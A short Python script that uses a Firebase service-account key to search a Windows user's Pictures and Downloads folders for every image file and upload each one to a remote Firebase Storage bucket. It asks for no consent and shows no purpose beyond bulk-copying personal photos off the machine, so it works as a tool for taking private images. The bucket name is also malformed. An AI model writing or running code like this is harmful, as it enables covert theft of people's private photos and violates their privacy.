import os
import fnmatch
import platform
import firebase_admin
from firebase_admin import credentials, storage

# Firebase initialization
cred = credentials.Certificate("phot.json")
firebase_admin.initialize_app(cred, {
    'storageBucket': 'koo-app-9bcd0/storage/koo-app-9bcd0.appspot.com'
})

bucket = storage.bucket()

# Define the file patterns for common photo formats
photo_patterns = ['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.tiff']

# Only consider Windows platform
if platform.system() == 'Windows':
    root_dirs = [
        os.path.expanduser('~/Pictures/'),
        os.path.expanduser('~/Downloads/')
    ]
else:
    print("This script is designed to run on Windows only.")
    root_dirs = []

# List to store paths of found photos
photos = []

# Walk through the directory structure and find photos
for root_dir in root_dirs:
    print(f"Searching in: {root_dir}")
    for dirpath, _, filenames in os.walk(root_dir):
        for pattern in photo_patterns:
            for filename in fnmatch.filter(filenames, pattern):
                photo_path = os.path.join(dirpath, filename)
                photos.append(photo_path)
                print(f"Found photo: {photo_path}")

# Upload each found photo to Firebase Cloud Storage
for photo_path in photos:
    blob = bucket.blob(f"photos/{os.path.basename(photo_path)}")
    blob.upload_from_filename(photo_path)
    print(f"Uploaded {photo_path} to Firebase Storage")

# Optionally, save the list of uploaded photos
if photos:  # Only save if photos were found
    with open('uploaded_photos_list.txt', 'w') as f:
        for photo in photos:
            f.write(photo + '\n')
    print(f"Uploaded {len(photos)} photos. List saved to uploaded_photos_list.txt")
else:
    print("No photos found. uploaded_photos_list.txt was not created.")
